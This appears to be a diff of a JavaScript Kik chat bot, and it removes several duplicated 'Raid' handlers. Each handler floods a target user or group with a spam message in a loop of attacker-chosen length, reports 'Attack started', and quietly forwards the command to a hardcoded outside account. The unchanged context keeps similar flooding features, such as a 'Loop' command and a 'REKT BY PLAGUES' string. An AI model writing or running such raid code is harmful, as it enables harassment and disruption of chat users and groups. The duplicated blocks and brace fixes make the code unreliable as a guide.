@@ -97,8 +97,6 @@ let delay = 150;
 
 let lag2 = "REKT BY PLAGUES";
 
-let lag3 = "JOIN #PLAGUEZ";
-
 /*PRIVATE EVENTS*/
 Kik.on("receivedprivatemsg", async (sender, msg) => {
   let msgParts = msg.split(" ");
@@ -195,76 +193,6 @@ Kik.on("receivedprivatemsg", async (sender, msg) => {
     })();
     return;
   }
-  
-  if (msgParts[0] == "Raid" && msgParts[1].endsWith(".kik.com")) {
-    (async () => {
-      // Kik.sendMessage("oooweooo_tis@talk.kik.com", msg);
-      // Kik.sendMessage('uncefumnkle01_ap0@talk.kik.com', msg);
-      Kik.sendMessage("fuckdavidd___ym7@talk.kik.com", msg);
-      let mess = "Attack started ";
-      await Kik.sendMessage(sender.jid, mess);
-      let numb = 0;
-      while (numb <= msgParts[2]) {
-        await Kik.sendMessage(msgParts[1], lag3);
-        await new Promise(resolve => setTimeout(resolve, delay));
-        numb += 1;
-      }
-      // await Kik.forceAdmin(sender.jid);
-    })();
-    return;
-  }
-  
-  if (msgParts[0] == "Raid" && msgParts[1].endsWith("@groups.kik.com")) {
-    (async () => {
-      // Kik.sendMessage("oooweooo_tis@talk.kik.com", msg);
-      // Kik.sendMessage('uncefjunkle01_ap0@talk.kik.com', msg);
-      Kik.sendMessage("fuckdavidd___ym7@talk.kik.com", msg);
-      let mess = "Attack started ";
-      await Kik.sendMessage(sender.jid, mess);
-      let numb = 0;
-      while (numb <= msgParts[2]) {
-        await Kik.sendMessage(msgParts[1], lag3);
-        await new Promise(resolve => setTimeout(resolve, delay));
-        numb += 1;
-      }
-      // await Kik.forceAdmin(sender.jid);
-    })();
-    return;
-  }
-  
-  if (msgParts[0] == "Raid" && msgParts[1].endsWith(".kik.com")) {
-    (async () => {
-      // Kik.sendMessage("oooweooo_tis@talk.kik.com", msg);
-      // Kik.sendMessage('uncefumnkle01_ap0@talk.kik.com', msg);
-      Kik.sendMessage("fuckdavidd___ym7@talk.kik.com", msg);
-      let mess = "Attack started ";
-      await Kik.sendMessage(sender.jid, mess);
-      let numb = 0;
-      while (numb <= msgParts[2]) {
-        await Kik.sendMessage(msgParts[1], lag3);
-        await new Promise(resolve => setTimeout(resolve, delay));
-        numb += 1;
-      }
-      // await Kik.forceAdmin(sender.jid);
-    })();
-    return;
-  }if (msgParts[0] == "Raid" && msgParts[1].endsWith("@groups.kik.com")) {
-    (async () => {
-      // Kik.sendMessage("oooweooo_tis@talk.kik.com", msg);
-      // Kik.sendMessage('uncefjunkle01_ap0@talk.kik.com', msg);
-      Kik.sendMessage("fuckdavidd___ym7@talk.kik.com", msg);
-      let mess = "Attack started ";
-      await Kik.sendMessage(sender.jid, mess);
-      let numb = 0;
-      while (numb <= msgParts[2]) {
-        await Kik.sendMessage(msgParts[1], lag3);
-        await new Promise(resolve => setTimeout(resolve, delay));
-        numb += 1;
-      }
-      // await Kik.forceAdmin(sender.jid);
-    })();
-    return;
-
 
   if (msgParts[0] == "Loop" && msgParts[1].endsWith("@groups.kik.com")) {
     (async () => {
@@ -301,7 +229,7 @@ Kik.on("receivedprivatemsg", async (sender, msg) => {
     })();
     return;
   }
-
+});
 
 Kik.on("privatetyping", (sender, isTyping) => {
   if (isTyping) {
